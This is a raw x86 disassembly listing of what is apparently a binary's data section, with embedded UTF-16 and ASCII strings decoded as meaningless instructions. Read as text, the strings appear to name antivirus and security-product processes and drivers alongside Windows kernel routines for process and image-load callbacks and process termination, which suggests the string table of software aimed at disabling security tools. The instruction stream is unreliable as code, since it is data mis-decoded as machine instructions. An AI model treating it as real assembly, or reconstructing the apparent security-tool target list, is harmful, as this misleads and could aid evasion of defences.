   1a8c6:	js     0x1a8c8
   1a8c8:	add    BYTE PTR gs:[eax],al
   1a8cb:	add    BYTE PTR [ebx+0x0],ch
   1a8ce:	ins    BYTE PTR es:[edi],dx
   1a8cf:	add    BYTE PTR [ecx+0x0],ch
   1a8d2:	ins    DWORD PTR es:[edi],dx
   1a8d3:	add    BYTE PTR ds:0x73002e00,dh
   1a8d9:	add    BYTE PTR [ecx+0x0],bh
   1a8dc:	jae    0x1a8de
   1a8de:	add    BYTE PTR [eax],al
   1a8e0:	imul   eax,DWORD PTR [eax],0x6c
   1a8e3:	add    BYTE PTR [ecx],dh
   1a8e5:	add    BYTE PTR [esi],ch
   1a8e7:	add    BYTE PTR [ebx+0x0],dh
   1a8ea:	jns    0x1a8ec
   1a8ec:	jae    0x1a8ee
   1a8ee:	add    BYTE PTR [eax],al
   1a8f0:	imul   eax,DWORD PTR [eax],0x6c
   1a8f3:	add    BYTE PTR [ecx+0x0],ch
   1a8f6:	data16 add BYTE PTR [esi],ch
   1a8f9:	add    BYTE PTR [ebx+0x0],dh
   1a8fc:	jns    0x1a8fe
   1a8fe:	jae    0x1a900
   1a900:	add    BYTE PTR [eax],al
   1a902:	imul   eax,DWORD PTR [eax],0x6c
   1a905:	add    BYTE PTR [ebx+0x0],dh
   1a908:	ja     0x1a90a
   1a90a:	add    BYTE PTR fs:[esi],ch
   1a90d:	add    BYTE PTR [ebp+0x0],ah
   1a910:	js     0x1a912
   1a912:	add    BYTE PTR gs:[eax],al
   1a915:	add    BYTE PTR [ebx+0x0],ch
   1a918:	popa   
   1a919:	add    BYTE PTR [esi+0x0],dh
   1a91c:	jae    0x1a91e
   1a91e:	jbe    0x1a920
   1a920:	arpl   WORD PTR [eax],ax
   1a922:	add    BYTE PTR cs:[ebp+0x0],ah
   1a926:	js     0x1a928
   1a928:	add    BYTE PTR gs:[eax],al
   1a92b:	add    BYTE PTR [ebx+0x0],ch
   1a92e:	popa   
   1a92f:	add    BYTE PTR [esi+0x0],dh
   1a932:	jae    0x1a934
   1a934:	jae    0x1a936
   1a936:	add    BYTE PTR cs:[ebp+0x0],ah
   1a93a:	js     0x1a93c
   1a93c:	add    BYTE PTR gs:[eax],al
   1a93f:	add    BYTE PTR [ebx+0x0],ch
   1a942:	popa   
   1a943:	add    BYTE PTR [esi+0x0],dh
   1a946:	add    BYTE PTR cs:[ebp+0x0],ah
   1a94a:	js     0x1a94c
   1a94c:	add    BYTE PTR gs:[eax],al
   1a94f:	add    BYTE PTR [ecx+0x0],ah
   1a952:	jbe    0x1a954
   1a954:	jo     0x1a956
   1a956:	ins    DWORD PTR es:[edi],dx
   1a957:	add    BYTE PTR [esi],ch
   1a959:	add    BYTE PTR [ebp+0x0],ah
   1a95c:	js     0x1a95e
   1a95e:	add    BYTE PTR gs:[eax],al
   1a961:	add    BYTE PTR [ecx+0x0],ah
   1a964:	jbe    0x1a966
   1a966:	jo     0x1a968
   1a968:	add    BYTE PTR cs:[ebp+0x0],ah
   1a96c:	js     0x1a96e
   1a96e:	add    BYTE PTR gs:[eax],al
   1a971:	add    BYTE PTR [ebx+0x0],dh
   1a974:	jo     0x1a976
   1a976:	je     0x1a978
   1a978:	add    BYTE PTR fs:[esi],ch
   1a97b:	add    BYTE PTR [ebx+0x0],dh
   1a97e:	jns    0x1a980
   1a980:	jae    0x1a982
   1a982:	add    BYTE PTR [eax],al
   1a984:	outs   dx,BYTE PTR ds:[esi]
   1a985:	add    BYTE PTR [edi+0x0],ch
   1a988:	add    BYTE PTR fs:[ebx],dh
   1a98b:	add    BYTE PTR [edx],dh
   1a98d:	add    BYTE PTR [edx+0x0],dh
   1a990:	popa   
   1a991:	add    BYTE PTR [esi],ch
   1a993:	add    BYTE PTR [ebp+0x0],ah
   1a996:	js     0x1a998
   1a998:	add    BYTE PTR gs:[eax],al
   1a99b:	add    BYTE PTR [esi+0x0],ch
   1a99e:	outs   dx,DWORD PTR ds:[esi]
   1a99f:	add    BYTE PTR [eax+eax*1+0x33],ah
   1a9a3:	add    BYTE PTR [edx],dh
   1a9a5:	add    BYTE PTR [ebx+0x0],ch
   1a9a8:	jb     0x1a9aa
   1a9aa:	outs   dx,BYTE PTR ds:[esi]
   1a9ab:	add    BYTE PTR [esi],ch
   1a9ad:	add    BYTE PTR [ebp+0x0],ah
   1a9b0:	js     0x1a9b2
   1a9b2:	add    BYTE PTR gs:[eax],al
   1a9b5:	add    BYTE PTR [esi+0x0],ah
   1a9b8:	jae    0x1a9ba
   1a9ba:	ins    DWORD PTR es:[edi],dx
   1a9bb:	add    BYTE PTR [ebx],dh
   1a9bd:	add    BYTE PTR [edx],dh
   1a9bf:	add    BYTE PTR [esi],ch
   1a9c1:	add    BYTE PTR [ebp+0x0],ah
   1a9c4:	js     0x1a9c6
   1a9c6:	add    BYTE PTR gs:[eax],al
   1a9c9:	add    BYTE PTR [esi+0x0],ah
   1a9cc:	jae    0x1a9ce
   1a9ce:	bound  eax,QWORD PTR [eax]
   1a9d0:	ins    BYTE PTR es:[edi],dx
   1a9d1:	add    BYTE PTR [esi],ch
   1a9d3:	add    BYTE PTR [ebp+0x0],ah
   1a9d6:	js     0x1a9d8
   1a9d8:	add    BYTE PTR gs:[eax],al
   1a9db:	add    BYTE PTR [esi+0x0],ah
   1a9de:	jae    0x1a9e0
   1a9e0:	popa   
   1a9e1:	add    BYTE PTR [esi+0x0],dh
   1a9e4:	xor    eax,DWORD PTR [eax]
   1a9e6:	xor    al,BYTE PTR [eax]
   1a9e8:	add    BYTE PTR cs:[ebp+0x0],ah
   1a9ec:	js     0x1a9ee
   1a9ee:	add    BYTE PTR gs:[eax],al
   1a9f1:	add    BYTE PTR [ebp+0x0],ch
   1a9f4:	arpl   WORD PTR [eax],ax
   1a9f6:	jae    0x1a9f8
   1a9f8:	push   0x65006900
   1a9fd:	add    BYTE PTR [eax+eax*1+0x64],ch
   1aa01:	add    BYTE PTR [esi],ch
   1aa03:	add    BYTE PTR [ebp+0x0],ah
   1aa06:	js     0x1aa08
   1aa08:	add    BYTE PTR gs:[eax],al
   1aa0b:	add    BYTE PTR [ebp+0x0],ch
   1aa0e:	jae    0x1aa10
   1aa10:	jae    0x1aa12
   1aa12:	jae    0x1aa14
   1aa14:	jb     0x1aa16
   1aa16:	jbe    0x1aa18
   1aa18:	add    BYTE PTR cs:[ebp+0x0],ah
   1aa1c:	js     0x1aa1e
   1aa1e:	add    BYTE PTR gs:[eax],al
   1aa21:	add    BYTE PTR [ebp+0x0],ch
   1aa24:	jo     0x1aa26
   1aa26:	data16 add BYTE PTR [ecx+0x0],ch
   1aa2a:	jb     0x1aa2c
   1aa2c:	add    BYTE PTR gs:[edi+0x0],dh
   1aa30:	popa   
   1aa31:	add    BYTE PTR [eax+eax*1+0x6c],ch
   1aa35:	add    BYTE PTR [esi],ch
   1aa37:	add    BYTE PTR [ebx+0x0],dh
   1aa3a:	jns    0x1aa3c
   1aa3c:	jae    0x1aa3e
   1aa3e:	add    BYTE PTR [eax],al
   1aa40:	ja     0x1aa42
   1aa42:	ins    BYTE PTR es:[edi],dx
   1aa43:	add    BYTE PTR [edi+0x0],bl
   1aa46:	push   0x6f006f00
   1aa4b:	add    BYTE PTR [ebx+0x0],ch
   1aa4e:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
   1aa53:	add    BYTE PTR [eax+eax*1+0x0],ch
   1aa57:	add    BYTE PTR [esi+0x0],ah
   1aa5a:	imul   eax,DWORD PTR [eax],0x74006c
   1aa60:	outs   dx,BYTE PTR ds:[esi]
   1aa61:	add    BYTE PTR [eax+eax*1+0x2e],dh
   1aa65:	add    BYTE PTR [ebx+0x0],dh
   1aa68:	jns    0x1aa6a
   1aa6a:	jae    0x1aa6c
   1aa6c:	add    BYTE PTR [eax],al
   1aa6e:	jae    0x1aa70
   1aa70:	popa   
   1aa71:	add    BYTE PTR [esi+0x0],ch
   1aa74:	add    BYTE PTR fs:[edx+0x0],ah
   1aa78:	outs   dx,DWORD PTR ds:[esi]
   1aa79:	add    BYTE PTR [eax+0x0],bh
   1aa7c:	add    BYTE PTR cs:[ebx+0x0],dh
   1aa80:	jns    0x1aa82
   1aa82:	jae    0x1aa84
   1aa84:	add    BYTE PTR [eax],al
   1aa86:	outs   dx,DWORD PTR ds:[esi]
   1aa87:	add    BYTE PTR [ebp+0x0],dh
   1aa8a:	je     0x1aa8c
   1aa8c:	jo     0x1aa8e
   1aa8e:	outs   dx,DWORD PTR ds:[esi]
   1aa8f:	add    BYTE PTR [ebx+0x0],dh
   1aa92:	je     0x1aa94
   1aa94:	add    BYTE PTR cs:[ebp+0x0],ah
   1aa98:	js     0x1aa9a
   1aa9a:	add    BYTE PTR gs:[eax],al
   1aa9d:	add    BYTE PTR [edx+0x0],ah
   1aaa0:	arpl   WORD PTR [eax],ax
   1aaa2:	data16 add BYTE PTR [eax+eax*1+0x64],dh
   1aaa7:	add    BYTE PTR [ecx+0x0],ch
   1aaaa:	add    BYTE PTR cs:[ebx+0x0],dh
   1aaae:	jns    0x1aab0
   1aab0:	jae    0x1aab2
   1aab2:	add    BYTE PTR [eax],al
   1aab4:	bound  eax,QWORD PTR [eax]
   1aab6:	arpl   WORD PTR [eax],ax
   1aab8:	data16 add BYTE PTR [ecx+0x0],ch
   1aabc:	ins    BYTE PTR es:[edi],dx
   1aabd:	add    BYTE PTR [eax+eax*1+0x65],dh
   1aac1:	add    BYTE PTR [edx+0x0],dh
   1aac4:	add    BYTE PTR cs:[ebx+0x0],dh
   1aac8:	jns    0x1aaca
   1aaca:	jae    0x1aacc
   1aacc:	add    BYTE PTR [eax],al
   1aace:	bound  eax,QWORD PTR [eax]
   1aad0:	arpl   WORD PTR [eax],ax
   1aad2:	pop    edi
   1aad3:	add    BYTE PTR [eax+eax*1+0x64],dh
   1aad7:	add    BYTE PTR [ecx+0x0],ch
   1aada:	pop    edi
   1aadb:	add    BYTE PTR [esi+0x0],ah
   1aade:	add    BYTE PTR cs:[ebx+0x0],dh
   1aae2:	jns    0x1aae4
   1aae4:	jae    0x1aae6
   1aae6:	add    BYTE PTR [eax],al
   1aae8:	bound  eax,QWORD PTR [eax]
   1aaea:	arpl   WORD PTR [eax],ax
   1aaec:	pop    edi
   1aaed:	add    BYTE PTR [eax+0x0],dh
   1aaf0:	jb     0x1aaf2
   1aaf2:	je     0x1aaf4
   1aaf4:	pop    edi
   1aaf5:	add    BYTE PTR [esi+0x0],ah
   1aaf8:	add    BYTE PTR cs:[ebx+0x0],dh
   1aafc:	jns    0x1aafe
   1aafe:	jae    0x1ab00
   1ab00:	add    BYTE PTR [eax],al
   1ab02:	bound  eax,QWORD PTR [eax]
   1ab04:	arpl   WORD PTR [eax],ax
   1ab06:	pop    edi
   1ab07:	add    BYTE PTR [eax+0x0],dh
   1ab0a:	popa   
   1ab0b:	add    BYTE PTR [eax+eax*1+0x5f],dh
   1ab0f:	add    BYTE PTR [esi+0x0],ah
   1ab12:	add    BYTE PTR cs:[ebx+0x0],dh
   1ab16:	jns    0x1ab18
   1ab18:	jae    0x1ab1a
   1ab1a:	add    BYTE PTR [eax],al
   1ab1c:	bound  eax,QWORD PTR [eax]
   1ab1e:	arpl   WORD PTR [eax],ax
   1ab20:	pop    edi
   1ab21:	add    BYTE PTR [esi+0x0],ch
   1ab24:	add    BYTE PTR [bp+0x0],ch
   1ab28:	add    BYTE PTR cs:[ebx+0x0],dh
   1ab2c:	jns    0x1ab2e
   1ab2e:	jae    0x1ab30
   1ab30:	add    BYTE PTR [eax],al
   1ab32:	bound  eax,QWORD PTR [eax]
   1ab34:	arpl   WORD PTR [eax],ax
   1ab36:	pop    edi
   1ab37:	add    BYTE PTR [ecx+0x0],ch
   1ab3a:	jo     0x1ab3c
   1ab3c:	pop    edi
   1ab3d:	add    BYTE PTR [esi+0x0],ah
   1ab40:	add    BYTE PTR cs:[ebx+0x0],dh
   1ab44:	jns    0x1ab46
   1ab46:	jae    0x1ab48
   1ab48:	add    BYTE PTR [eax],al
   1ab4a:	bound  eax,QWORD PTR [eax]
   1ab4c:	arpl   WORD PTR [eax],ax
   1ab4e:	pop    edi
   1ab4f:	add    BYTE PTR [eax+0x0],ch
   1ab52:	popa   
   1ab53:	add    BYTE PTR [ebx+0x0],dh
   1ab56:	jae    0x1ab58
   1ab58:	push   0x66005f00
   1ab5d:	add    BYTE PTR [esi],ch
   1ab5f:	add    BYTE PTR [ebx+0x0],dh
   1ab62:	jns    0x1ab64
   1ab64:	jae    0x1ab66
   1ab66:	add    BYTE PTR [eax],al
   1ab68:	jbe    0x1ab6a
   1ab6a:	jae    0x1ab6c
   1ab6c:	add    BYTE PTR fs:[ecx+0x0],ah
   1ab70:	je     0x1ab72
   1ab72:	popa   
   1ab73:	add    BYTE PTR [esi+0x0],ch
   1ab76:	je     0x1ab78
   1ab78:	add    BYTE PTR cs:[ebx+0x0],dh
   1ab7c:	jns    0x1ab7e
   1ab7e:	jae    0x1ab80
   1ab80:	add    BYTE PTR [eax],al
   1ab82:	jp     0x1ab84
   1ab84:	arpl   WORD PTR [eax],ax
   1ab86:	ins    BYTE PTR es:[edi],dx
   1ab87:	add    BYTE PTR [ecx+0x0],ch
   1ab8a:	add    BYTE PTR gs:[esi+0x0],ch
   1ab8e:	je     0x1ab90
   1ab90:	add    BYTE PTR cs:[ebp+0x0],ah
   1ab94:	js     0x1ab96
   1ab96:	add    BYTE PTR gs:[eax],al
   1ab99:	add    BYTE PTR [edi+0x0],dh
   1ab9c:	popa   
   1ab9d:	add    BYTE PTR [eax+eax*1+0x63],dh
   1aba1:	add    BYTE PTR [eax+0x0],ch
   1aba4:	add    BYTE PTR fs:[edi+0x0],ch
   1aba8:	add    BYTE PTR ds:0x7300,ch
   1abad:	add    BYTE PTR [ecx+0x0],bh
   1abb0:	jae    0x1abb2
   1abb2:	add    BYTE PTR [eax],al
   1abb4:	add    BYTE PTR [bp+di+0x0],ah
   1abb8:	popa   
   1abb9:	add    BYTE PTR [ebx+0x0],dh
   1abbc:	jae    0x1abbe
   1abbe:	add    BYTE PTR gs:[edx+0x0],dh
   1abc2:	jbe    0x1abc4
   1abc4:	add    BYTE PTR cs:[ebp+0x0],ah
   1abc8:	js     0x1abca
   1abca:	add    BYTE PTR gs:[eax],al
   1abcd:	add    BYTE PTR [eax+eax*1+0x0],bl
   1abd1:	add    BYTE PTR [ebp+0x0],ch
   1abd4:	jae    0x1abd6
   1abd6:	jbe    0x1abd8
   1abd8:	arpl   WORD PTR [eax],ax
   1abda:	jb     0x1abdc
   1abdc:	aaa    
   1abdd:	add    BYTE PTR [ecx],dh
   1abdf:	add    BYTE PTR [esi],ch
   1abe1:	add    BYTE PTR [eax+eax*1+0x6c],ah
   1abe5:	add    BYTE PTR [eax+eax*1+0x0],ch
   1abe9:	add    BYTE PTR [ebp+0x0],ch
   1abec:	jae    0x1abee
   1abee:	jbe    0x1abf0
   1abf0:	arpl   WORD PTR [eax],ax
   1abf2:	jb     0x1abf4
   1abf4:	je     0x1abf6
   1abf6:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
   1abfb:	add    BYTE PTR [eax+eax*1+0x0],ch
   1abff:	add    BYTE PTR [ebx+0x0],ch
   1ac02:	add    BYTE PTR gs:[edx+0x0],dh
   1ac06:	outs   dx,BYTE PTR ds:[esi]
   1ac07:	add    BYTE PTR [ebp+0x0],ah
   1ac0a:	ins    BYTE PTR es:[edi],dx
   1ac0b:	add    BYTE PTR [ebx],dh
   1ac0d:	add    BYTE PTR [edx],dh
   1ac0f:	add    BYTE PTR [esi],ch
   1ac11:	add    BYTE PTR [eax+eax*1+0x6c],ah
   1ac15:	add    BYTE PTR [eax+eax*1+0x0],ch
   1ac19:	add    BYTE PTR [eax+eax*1+0x73],ch
   1ac1d:	add    BYTE PTR [ecx+0x0],ah
   1ac20:	jae    0x1ac22
   1ac22:	jb     0x1ac24
   1ac24:	jbe    0x1ac26
   1ac26:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
   1ac2b:	add    BYTE PTR [eax+eax*1+0x0],ch
   1ac2f:	add    BYTE PTR [ebp+0x0],dh
   1ac32:	jae    0x1ac34
   1ac34:	add    BYTE PTR gs:[edx+0x0],dh
   1ac38:	imul   eax,DWORD PTR [eax],0x69006e
   1ac3e:	je     0x1ac40
   1ac40:	add    BYTE PTR cs:[ebp+0x0],ah
   1ac44:	js     0x1ac46
   1ac46:	add    BYTE PTR gs:[eax],al
   1ac49:	add    BYTE PTR [eax+eax*1+0x4d],dl
   1ac4d:	add    BYTE PTR [eax+0x0],dl
   1ac50:	add    BYTE PTR [eax],al
   1ac52:	push   eax
   1ac53:	add    BYTE PTR [ebx+0x0],dh
   1ac56:	push   ebx
   1ac57:	add    BYTE PTR [ebp+0x0],ah
   1ac5a:	je     0x1ac5c
   1ac5c:	inc    ebx
   1ac5d:	add    BYTE PTR [edx+0x0],dh
   1ac60:	add    BYTE PTR gs:[ecx+0x0],ah
   1ac64:	je     0x1ac66
   1ac66:	add    BYTE PTR gs:[eax+eax*1+0x68],dl
   1ac6b:	add    BYTE PTR [edx+0x0],dh
   1ac6e:	add    BYTE PTR gs:[ecx+0x0],ah
   1ac72:	add    BYTE PTR fs:[esi+0x0],cl
   1ac76:	outs   dx,DWORD PTR ds:[esi]
   1ac77:	add    BYTE PTR [eax+eax*1+0x69],dh
   1ac7b:	add    BYTE PTR [esi+0x0],ah
   1ac7e:	jns    0x1ac80
   1ac80:	push   edx
   1ac81:	add    BYTE PTR [edi+0x0],ch
   1ac84:	jne    0x1ac86
   1ac86:	je     0x1ac88
   1ac88:	imul   eax,DWORD PTR [eax],0x65006e
   1ac8e:	add    BYTE PTR [eax],al
   1ac90:	push   eax
   1ac91:	add    BYTE PTR [ebx+0x0],dh
   1ac94:	push   ebx
   1ac95:	add    BYTE PTR [ebp+0x0],ah
   1ac98:	je     0x1ac9a
   1ac9a:	inc    ebx
   1ac9b:	add    BYTE PTR [edx+0x0],dh
   1ac9e:	add    BYTE PTR gs:[ecx+0x0],ah
   1aca2:	je     0x1aca4
   1aca4:	add    BYTE PTR gs:[eax+0x0],dl
   1aca8:	jb     0x1acaa
   1acaa:	outs   dx,DWORD PTR ds:[esi]
   1acab:	add    BYTE PTR [ebx+0x0],ah
   1acae:	add    BYTE PTR gs:[ebx+0x0],dh
   1acb2:	jae    0x1acb4
   1acb4:	dec    esi
   1acb5:	add    BYTE PTR [edi+0x0],ch
   1acb8:	je     0x1acba
   1acba:	imul   eax,DWORD PTR [eax],0x790066
   1acc0:	push   edx
   1acc1:	add    BYTE PTR [edi+0x0],ch
   1acc4:	jne    0x1acc6
   1acc6:	je     0x1acc8
   1acc8:	imul   eax,DWORD PTR [eax],0x65006e
   1acce:	add    BYTE PTR [eax],al
   1acd0:	push   eax
   1acd1:	add    BYTE PTR [ebx+0x0],dh
   1acd4:	push   edx
   1acd5:	add    BYTE PTR [ebp+0x0],ah
   1acd8:	ins    DWORD PTR es:[edi],dx
   1acd9:	add    BYTE PTR [edi+0x0],ch
   1acdc:	jbe    0x1acde
   1acde:	add    BYTE PTR gs:[eax+eax*1+0x6f],cl
   1ace3:	add    BYTE PTR [ecx+0x0],ah
   1ace6:	add    BYTE PTR fs:[ecx+0x0],cl
   1acea:	ins    DWORD PTR es:[edi],dx
   1aceb:	add    BYTE PTR [ecx+0x0],ah
   1acee:	add    BYTE PTR [di+0x0],ah
   1acf2:	dec    esi
   1acf3:	add    BYTE PTR [edi+0x0],ch
   1acf6:	je     0x1acf8
   1acf8:	imul   eax,DWORD PTR [eax],0x790066
   1acfe:	push   edx
   1acff:	add    BYTE PTR [edi+0x0],ch
   1ad02:	jne    0x1ad04
   1ad04:	je     0x1ad06
   1ad06:	imul   eax,DWORD PTR [eax],0x65006e
   1ad0c:	add    BYTE PTR [eax],al
   1ad0e:	push   eax
   1ad0f:	add    BYTE PTR [ebx+0x0],dh
   1ad12:	push   ebx
   1ad13:	add    BYTE PTR [ebp+0x0],ah
   1ad16:	je     0x1ad18
   1ad18:	dec    esp
   1ad19:	add    BYTE PTR [edi+0x0],ch
   1ad1c:	popa   
   1ad1d:	add    BYTE PTR [eax+eax*1+0x49],ah
   1ad21:	add    BYTE PTR [ebp+0x0],ch
   1ad24:	popa   
   1ad25:	add    BYTE PTR [edi+0x0],ah
   1ad28:	add    BYTE PTR gs:[esi+0x0],cl
   1ad2c:	outs   dx,DWORD PTR ds:[esi]
   1ad2d:	add    BYTE PTR [eax+eax*1+0x69],dh
   1ad31:	add    BYTE PTR [esi+0x0],ah
   1ad34:	jns    0x1ad36
   1ad36:	push   edx
   1ad37:	add    BYTE PTR [edi+0x0],ch
   1ad3a:	jne    0x1ad3c
   1ad3c:	je     0x1ad3e
   1ad3e:	imul   eax,DWORD PTR [eax],0x65006e
   1ad44:	add    BYTE PTR [eax],al
   1ad46:	outs   dx,BYTE PTR ds:[esi]
   1ad47:	je     0x1adb8
   1ad49:	jae    0x1adb6
   1ad4b:	jb     0x1adbb
   1ad4d:	ins    BYTE PTR es:[edi],dx
   1ad4e:	cs gs js 0x1adb7
   1ad52:	add    ah,cl
   1ad54:	push   eax
   1ad55:	jae    0x1adaa
   1ad57:	gs je  0x1ad9d
   1ad5a:	jb     0x1adc1
   1ad5c:	popa   
   1ad5d:	je     0x1adc4
   1ad5f:	push   esp
   1ad60:	push   0x64616572
   1ad65:	dec    esi
   1ad66:	outs   dx,DWORD PTR ds:[esi]
   1ad67:	je     0x1add2
   1ad69:	data16 jns 0x1adbe
   1ad6c:	outs   dx,DWORD PTR ds:[esi]
   1ad6d:	jne    0x1ade3
   1ad6f:	imul   ebp,DWORD PTR [esi+0x65],0x7350cc00
   1ad76:	push   ebx
   1ad77:	gs je  0x1adbd
   1ad7a:	jb     0x1ade1
   1ad7c:	popa   
   1ad7d:	je     0x1ade4
   1ad7f:	push   eax
   1ad80:	jb     0x1adf1
   1ad82:	arpl   WORD PTR [ebp+0x73],sp
   1ad85:	jae    0x1add5
   1ad87:	outs   dx,DWORD PTR ds:[esi]
   1ad88:	je     0x1adf3
   1ad8a:	data16 jns 0x1addf
   1ad8d:	outs   dx,DWORD PTR ds:[esi]
   1ad8e:	jne    0x1ae04
   1ad90:	imul   ebp,DWORD PTR [esi+0x65],0x52735000
   1ad97:	gs ins DWORD PTR es:[edi],dx
   1ad99:	outs   dx,DWORD PTR ds:[esi]
   1ad9a:	jbe    0x1ae01
   1ad9c:	dec    esp
   1ad9d:	outs   dx,DWORD PTR ds:[esi]
   1ad9e:	popa   
   1ad9f:	fs dec ecx
   1ada1:	ins    DWORD PTR es:[edi],dx
   1ada2:	popa   
   1ada3:	addr16 gs dec esi
   1ada6:	outs   dx,DWORD PTR ds:[esi]
   1ada7:	je     0x1ae12
   1ada9:	data16 jns 0x1adfe
   1adac:	outs   dx,DWORD PTR ds:[esi]
   1adad:	jne    0x1ae23
   1adaf:	imul   ebp,DWORD PTR [esi+0x65],0x7350cc00
   1adb6:	push   ebx
   1adb7:	gs je  0x1ae06
   1adba:	outs   dx,DWORD PTR ds:[esi]
   1adbb:	popa   
   1adbc:	fs dec ecx
   1adbe:	ins    DWORD PTR es:[edi],dx
   1adbf:	popa   
   1adc0:	addr16 gs dec esi
   1adc3:	outs   dx,DWORD PTR ds:[esi]
   1adc4:	je     0x1ae2f
   1adc6:	data16 jns 0x1ae1b
   1adc9:	outs   dx,DWORD PTR ds:[esi]
   1adca:	jne    0x1ae40
   1adcc:	imul   ebp,DWORD PTR [esi+0x65],0x44744e00
   1add3:	gs ins BYTE PTR es:[edi],dx
   1add5:	gs je  0x1ae3d
   1add8:	inc    esi
   1add9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52744ecc
   1ade1:	gs popa 
   1ade3:	fs inc esi
   1ade5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52744ecc
   1aded:	gs popa 
   1adef:	fs push esi
   1adf1:	imul   esi,DWORD PTR [edx+0x74],0x4d6c6175
   1adf8:	gs ins DWORD PTR es:[edi],dx
   1adfa:	outs   dx,DWORD PTR ds:[esi]
   1adfb:	jb     0x1ae76
   1adfd:	add    BYTE PTR [esi+0x74],cl
   1ae00:	push   esp
   1ae01:	gs jb  0x1ae71
   1ae04:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
   1ae0b:	outs   dx,DWORD PTR ds:[esi]
   1ae0c:	arpl   WORD PTR [ebp+0x73],sp
   1ae0f:	jae    0x1ae11
   1ae11:	int3   
   1ae12:	dec    esi
   1ae13:	je     0x1ae69
   1ae15:	gs jb  0x1ae85
   1ae18:	imul   ebp,DWORD PTR [esi+0x61],0x68546574
   1ae1f:	jb     0x1ae86
   1ae21:	popa   
   1ae22:	add    BYTE PTR fs:[esi+0x74],cl
   1ae26:	push   ebx
   1ae27:	jne    0x1ae9c
   1ae29:	jo     0x1ae90
   1ae2b:	outs   dx,BYTE PTR ds:[esi]
   1ae2c:	fs push esp
   1ae2e:	push   0x64616572
   1ae33:	add    BYTE PTR [esi+0x74],cl
   1ae36:	inc    ebx
   1ae37:	jb     0x1ae9e
   1ae39:	popa   
   1ae3a:	je     0x1aea1
   1ae3c:	push   esp
   1ae3d:	push   0x64616572
   1ae42:	add    ah,cl
   1ae44:	dec    esi
   1ae45:	je     0x1ae98
   1ae47:	jne    0x1aeae
   1ae49:	jb     0x1aec4
   1ae4b:	push   ebx
   1ae4c:	jns    0x1aec1
   1ae4e:	je     0x1aeb5
   1ae50:	ins    DWORD PTR es:[edi],dx
   1ae51:	dec    ecx
   1ae52:	outs   dx,BYTE PTR ds:[esi]
   1ae53:	outs   dx,WORD PTR ds:[esi]
   1ae55:	jb     0x1aec4
   1ae57:	popa   
   1ae58:	je     0x1aec3
   1ae5a:	outs   dx,DWORD PTR ds:[esi]
   1ae5b:	outs   dx,BYTE PTR ds:[esi]
   1ae5c:	add    ah,cl
   1ae5e:	dec    esi
   1ae5f:	je     0x1aeb2
   1ae61:	jne    0x1aec8
   1ae63:	jb     0x1aede
   1ae65:	dec    ecx
   1ae66:	outs   dx,BYTE PTR ds:[esi]
   1ae67:	outs   dx,WORD PTR ds:[esi]
   1ae69:	jb     0x1aed8
   1ae6b:	popa   
   1ae6c:	je     0x1aed7
   1ae6e:	outs   dx,DWORD PTR ds:[esi]
   1ae6f:	outs   dx,BYTE PTR ds:[esi]
   1ae70:	push   eax
   1ae71:	jb     0x1aee2
   1ae73:	arpl   WORD PTR [ebp+0x73],sp
   1ae76:	jae    0x1ae78
   1ae78:	dec    esi
   1ae79:	je     0x1aecc
   1ae7b:	jne    0x1aee2
   1ae7d:	jb     0x1aef8
   1ae7f:	dec    ecx
   1ae80:	outs   dx,BYTE PTR ds:[esi]
   1ae81:	outs   dx,WORD PTR ds:[esi]
   1ae83:	jb     0x1aef2
   1ae85:	popa   
   1ae86:	je     0x1aef1
   1ae88:	outs   dx,DWORD PTR ds:[esi]
   1ae89:	outs   dx,BYTE PTR ds:[esi]
   1ae8a:	push   esp
   1ae8b:	push   0x64616572
   1ae90:	add    ah,cl
   1ae92:	dec    esi
   1ae93:	je     0x1aee6
   1ae95:	jne    0x1aefc
   1ae97:	jb     0x1af12
   1ae99:	dec    ecx
   1ae9a:	outs   dx,BYTE PTR ds:[esi]
   1ae9b:	outs   dx,WORD PTR ds:[esi]
   1ae9d:	jb     0x1af0c
   1ae9f:	popa   
   1aea0:	je     0x1af0b
   1aea2:	outs   dx,DWORD PTR ds:[esi]
   1aea3:	outs   dx,BYTE PTR ds:[esi]
   1aea4:	inc    esi
   1aea5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x51744ecc
   1aead:	jne    0x1af14
   1aeaf:	jb     0x1af2a
   1aeb1:	inc    esp
   1aeb2:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
   1aeb9:	jns    0x1af01
   1aebb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x57744ecc
   1aec3:	jb     0x1af2e
   1aec5:	je     0x1af2c
   1aec7:	inc    esi
   1aec8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x7243744e
   1aed0:	gs popa 
   1aed2:	je     0x1af39
   1aed4:	inc    esi
   1aed5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4f744ecc
   1aedd:	jo     0x1af44
   1aedf:	outs   dx,BYTE PTR ds:[esi]
   1aee0:	inc    esi
   1aee1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4f744ecc
   1aee9:	jo     0x1af50
   1aeeb:	outs   dx,BYTE PTR ds:[esi]
   1aeec:	push   eax
   1aeed:	jb     0x1af5e
   1aeef:	arpl   WORD PTR [ebp+0x73],sp
   1aef2:	jae    0x1aef4
   1aef4:	dec    esi
   1aef5:	je     0x1af46
   1aef7:	jo     0x1af5e
   1aef9:	outs   dx,BYTE PTR ds:[esi]
   1aefa:	push   esp
   1aefb:	push   0x64616572
   1af00:	add    ah,cl
   1af02:	and    eax,0x73252a64
   1af07:	sub    ah,BYTE PTR ds:0x2a583830
   1af0d:	dec    esi
   1af0e:	push   edx
   1af0f:	or     eax,0x6425000a
   1af14:	sub    ah,BYTE PTR ds:0x30252a73
   1af1a:	cmp    BYTE PTR [eax+0xd],bl
   1af1d:	or     al,BYTE PTR [eax]
   1af1f:	int3   
   1af20:	pop    esp
   1af21:	add    BYTE PTR [eax+eax*1+0x72],al
   1af25:	add    BYTE PTR [ecx+0x0],ch
   1af28:	jbe    0x1af2a
   1af2a:	add    BYTE PTR gs:[edx+0x0],dh
   1af2e:	add    BYTE PTR [eax],al
   1af30:	and    eax,0x5fcc0064
   1af35:	add    BYTE PTR [ebx+0x0],ch
   1af38:	add    BYTE PTR fs:[edx+0x0],dh
